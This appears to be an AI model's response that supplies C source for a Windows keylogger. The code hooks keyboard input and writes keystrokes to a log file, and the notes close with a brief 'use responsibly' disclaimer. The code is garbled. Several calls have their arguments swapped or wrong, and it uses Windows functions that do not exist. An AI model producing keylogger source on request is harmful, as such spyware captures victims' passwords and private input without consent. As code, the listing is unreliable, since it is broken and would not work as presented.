### Full Code:
```c
#include <windows.h>
#include <tchar.h>
#include <time.h>
#include <conio.h>

#define DWORD unsigned int
#define HHOOK HANDLE
#define KEYBOARD_EVENT 0x00010708
#define THREAD WINAPI

typedef void (*_KEYBOARD_CALLBACK)(int, WPARAM, LPARAM);
typedef HHOOK CALLBACK function;

void LogKeystroke(char key, int x, int y) {
    FILE* file;
    fopen_s(&file, "a", "keystrokes.log");
    if (file) {
        char buffer[256];
        int bytesWritten;
        unsigned char* keystroke = &key;
        ReadFile(file, buffer, 1, &bytesWritten, keystroke);
        fclose(file);
    }
}

LRESULT CALLBACK keyboardCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (wParam == VK_KEYDOWN) {
        bool shift = (GetKeyState(VK_SHIFT) & 0x1) != 0;
        bool ctrl = (GetKeyState(VK_CONTROL) & 0x1) != 0;
        bool alt = (GetKeyState(VK_MENU) & 0x1) != 0;

        char key = ToUnicode(wParam, 0);
        LogKeystroke(key, GetPointFromCoordinate(0, 0));
    }
    return 0;
}

THREAD WINAPI threadFunction(void* p) {
    MSG msg;
    while (true) {
        if (PeekMessage(&msg, GetDesktopWindow(), 0, 0)) {
            if (msg.message == WM_KEYDOWN || msg.message == WM_KEYUP) {
                keyboardCallback(msg.wParam, msg.message, msg.lParam);
            }
        }
        Sleep(100);
    }
}

int main() {
    HWND hwnd = GetDesktopWindow();
    HHOOK hook = SetWindowsHook(hwnd, KEYBOARD_EVENT, keyboardCallback);
    THREAD thread;
    CreateThread(&thread, 0, threadFunction, 0, 0, 0);
    Sleep(500);
    UnhookWindowsHook(hook, GetModuleHandle(0));
    DeleteThread(thread);
    return 0;
}
```

### Notes:
- This code is a basic implementation and may need adjustments for specific needs.
- Ensure you have the necessary compiler and development environment set up.
- Use this responsibly and with proper authorization.<｜end▁of▁sentence｜>

